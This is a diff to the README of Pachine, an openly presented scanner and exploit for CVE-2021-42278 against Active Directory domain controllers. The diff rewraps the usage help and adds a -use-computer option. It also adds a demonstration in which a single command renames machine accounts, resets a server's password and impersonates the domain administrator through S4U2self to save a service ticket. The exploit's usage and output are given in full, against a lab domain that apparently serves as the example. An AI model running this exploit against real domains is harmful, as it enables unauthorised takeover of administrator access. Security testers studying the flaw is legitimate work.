@@ -11,10 +11,17 @@ $ pip3 install impacket
 ## Usage
 
 ```
-Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
+Impacket v0.9.23.dev1+20210427.174742.fc72ebad - Copyright 2020 SecureAuth Corporation
 
-usage: pachine.py [-h] [-scan] [-spn SPN] [-impersonate IMPERSONATE] [-domain-netbios NETBIOSNAME] [-computer-name NEW-COMPUTER-NAME$] [-computer-pass password] [-debug] [-method {SAMR,LDAPS}] [-port {139,445,636}] [-baseDN DC=test,DC=local]
-                  [-computer-group CN=Computers,DC=test,DC=local] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] -dc-host hostname [-dc-ip ip]
+usage: pachine.py [-h] [-scan] [-spn SPN] [-impersonate IMPERSONATE]
+                  [-domain-netbios NETBIOSNAME]
+                  [-use-computer USE-COMPUTER-NAME$]
+                  [-computer-name NEW-COMPUTER-NAME$]
+                  [-computer-pass password] [-debug] [-method {SAMR,LDAPS}]
+                  [-port {139,445,636}] [-baseDN DC=test,DC=local]
+                  [-computer-group CN=Computers,DC=test,DC=local]
+                  [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
+                  -dc-host hostname [-dc-ip ip]
                   [domain/]username[:password]
 
 Pachine - CVE-2021-42278 Scanner & Exploit
@@ -26,34 +33,55 @@ positional arguments:
 optional arguments:
   -h, --help            show this help message and exit
   -scan                 Scan the DC
-  -spn SPN              SPN (service/server) of the target service the service ticket will be generated for
+  -spn SPN              SPN (service/server) of the target service the service
+                        ticket will be generated for
   -impersonate IMPERSONATE
-                        target username that will be impersonated (through S4U2Self) for quering the ST. Keep in mind this will only work if the identity provided in this scripts is allowed for delegation to the SPN specified
+                        target username that will be impersonated (through
+                        S4U2Self) for quering the ST. Keep in mind this will
+                        only work if the identity provided in this scripts is
+                        allowed for delegation to the SPN specified
   -domain-netbios NETBIOSNAME
-                        Domain NetBIOS name. Required if the DC has multiple domains.
+                        Domain NetBIOS name. Required if the DC has multiple
+                        domains.
+  -use-computer USE-COMPUTER-NAME$
+                        Name of the computer account you want to use.
   -computer-name NEW-COMPUTER-NAME$
-                        Name of new computer. If omitted, a random DESKTOP-[A-Z0-9]{8} will be used.
+                        Name of new computer. If omitted, a random
+                        DESKTOP-[A-Z0-9]{8} will be used.
   -computer-pass password
-                        Password to set to computer. If omitted, a random [A-Za-z0-9]{32} will be used.
+                        Password to set to computer. If omitted, a random
+                        [A-Za-z0-9]{32} will be used.
   -debug                Turn DEBUG output ON
-  -method {SAMR,LDAPS}  Method of adding the computer. SAMR works over SMB. LDAPS has some certificate requirements and isn't always available.
-  -port {139,445,636}   Destination port to connect to. SAMR defaults to 445, LDAPS to 636.
+  -method {SAMR,LDAPS}  Method of adding the computer. SAMR works over SMB.
+                        LDAPS has some certificate requirements and isn't
+                        always available.
+  -port {139,445,636}   Destination port to connect to. SAMR defaults to 445,
+                        LDAPS to 636.
 
 LDAP:
   -baseDN DC=test,DC=local
-                        Set baseDN for LDAP. If ommited, the domain part (FQDN) specified in the account parameter will be used.
+                        Set baseDN for LDAP. If ommited, the domain part
+                        (FQDN) specified in the account parameter will be
+                        used.
   -computer-group CN=Computers,DC=test,DC=local
-                        Group to which the account will be added. If omitted, CN=Computers will be used,
+                        Group to which the account will be added. If omitted,
+                        CN=Computers will be used,
 
 authentication:
   -hashes LMHASH:NTHASH
                         NTLM hashes, format is LMHASH:NTHASH
   -no-pass              don't ask for password (useful for -k)
-  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on account parameters. If valid credentials cannot be found, it will use the ones specified in the command line
-  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
+  -k                    Use Kerberos authentication. Grabs credentials from
+                        ccache file (KRB5CCNAME) based on account parameters.
+                        If valid credentials cannot be found, it will use the
+                        ones specified in the command line
+  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256
+                        bits)
   -dc-host hostname     FQDN of the domain controller to target.
-  -dc-ip ip             IP of the domain controller to use. Useful if you can't translate the FQDN.specified in the account parameter will be used
-                                                                                                                                                                                                                                                              
+  -dc-ip ip             IP of the domain controller to use. Useful if you
+                        can't translate the FQDN.specified in the account
+                        parameter will be used
+
 ```
 
 ### Demonstration
@@ -87,6 +115,24 @@ Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
 [*] Got TGS for administrator@predator.local for dc@PREDATOR.LOCAL
 [*] Changing sname from dc@PREDATOR.LOCAL to cifs/dc.predator.local@PREDATOR.LOCAL
 [*] Changed machine account name from DESKTOP-XS5FCF1Y$ to dc
+[*] Saving ticket in administrator@predator.local.ccache
+```
+
+#### Target another machine
+
+```bash
+$ python3 pachine.py -dc-host dc.predator.local -spn cifs/server.predator.local -use-computer dc -impersonate administrator 'predator.local/john:Passw0rd!'
+Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
+
+[*] Changed machine account name from dc to server
+[*] Machine account server already exists. Trying to change password.
+[*] Changed password of server to K4Vd6JZC9H9OJh67GjxLVUWbtC3GyC1X.
+[*] Got TGT for server@PREDATOR.LOCAL
+[*] Changed machine account name from dc to DESKTOP-XS5FCF1Y$
+[*] Requesting S4U2self
+[*] Got TGS for administrator@predator.local for server@PREDATOR.LOCAL
+[*] Changing sname from server@PREDATOR.LOCAL to cifs/server.predator.local@PREDATOR.LOCAL
+[*] Changed machine account name from DESKTOP-XS5FCF1Y$ to server
 [*] Saving ticket in administrator@predator.local.ccache
 ```
 
